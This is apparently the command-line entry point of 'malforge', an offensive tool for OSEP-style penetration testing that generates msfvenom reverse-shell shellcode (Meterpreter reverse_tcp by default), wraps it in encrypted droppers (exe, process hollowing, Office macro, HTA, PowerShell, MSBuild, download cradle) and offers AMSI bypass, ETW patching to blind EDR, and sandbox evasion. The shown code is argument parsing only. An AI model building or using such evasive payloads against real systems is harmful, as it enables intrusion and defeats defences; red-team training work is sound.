import argparse
import sys

from . import __version__, crypt, emit
from .forge import run, COMPAT


def main():
    p = argparse.ArgumentParser(
        prog='malforge',
        description='shellcode encryption + payload generation for OSEP engagements',
    )
    p.add_argument('-v', '--version', action='version', version=f'malforge {__version__}')

    # shellcode input
    inp = p.add_argument_group('shellcode input')
    inp.add_argument('-i', '--input', metavar='FILE',
                     help='shellcode file (raw .bin, hex, or csharp format)')
    inp.add_argument('-l', '--lhost', metavar='IP',
                     help='listener IP (generates shellcode via msfvenom)')
    inp.add_argument('-p', '--lport', metavar='PORT',
                     help='listener port')
    inp.add_argument('--payload', metavar='MSF_PAYLOAD',
                     help='msfvenom payload (default: windows/x64/meterpreter/reverse_tcp)')

    # output format
    out = p.add_argument_group('output')
    out.add_argument('-f', '--format', metavar='FMT', required='--formats' not in sys.argv and '--encodings' not in sys.argv,
                     help='output format (exe, hollow, dll, macro, hta, ps1, js, msbuild, installutil)')
    out.add_argument('-o', '--output', metavar='FILE',
                     help='output file (default: stdout)')

    # encryption
    enc = p.add_argument_group('encryption')
    enc.add_argument('-e', '--encrypt', metavar='METHOD',
                     help='encryption chain, comma-separated (xor, aes, rc4, caesar)')
    enc.add_argument('--key', metavar='HEX',
                     help='encryption key as hex (auto-generated if not set)')

    # evasion
    evade = p.add_argument_group('evasion')
    evade.add_argument('--amsi', action='store_true', help='include AMSI bypass')
    evade.add_argument('--etw', action='store_true', help='patch EtwEventWrite to blind EDR telemetry')
    evade.add_argument('--sandbox', action='store_true', help='include sandbox evasion checks')

    # jscript-specific
    p.add_argument('--url', metavar='URL', help='payload URL for jscript download cradle')

    # info flags
    p.add_argument('--formats', action='store_true', help='list available output formats')
    p.add_argument('--encodings', action='store_true', help='list available encryption methods')

    args = p.parse_args()

    if args.formats:
        print('Available formats:\n')
        print(f'  {"format":<14} {"type":<20} {"encryption":<20}')
        print(f'  {"------":<14} {"----":<20} {"----------":<20}')
        for name in sorted(emit.FORMATS):
            tmpl, lang = emit.FORMATS[name]
            supported = ', '.join(sorted(COMPAT[name])) if COMPAT[name] else 'n/a (download cradle)'
            desc = tmpl.replace('.cs', '').replace('.vba', '').replace('.hta', '').replace('.ps1', '').replace('.js', '').replace('.csproj', '')
            print(f'  {name:<14} {desc:<20} {supported}')
        return

    if args.encodings:
        print('Available encryption methods:\n')
        for name in sorted(crypt.METHODS):
            notes = {
                'xor': 'multi-byte XOR (all formats)',
                'aes': 'AES-256-CBC with PKCS7 (C#, PS1 only)',
                'rc4': 'RC4 stream cipher (C#, PS1 only)',
                'caesar': 'byte shift / ROT (all formats)',
            }
            print(f'  {name:<10} {notes.get(name, "")}')
        print('\nChain multiple: -e xor,aes  (encrypts XOR first, then AES)')
        return

    run(args)


if __name__ == '__main__':
    main()
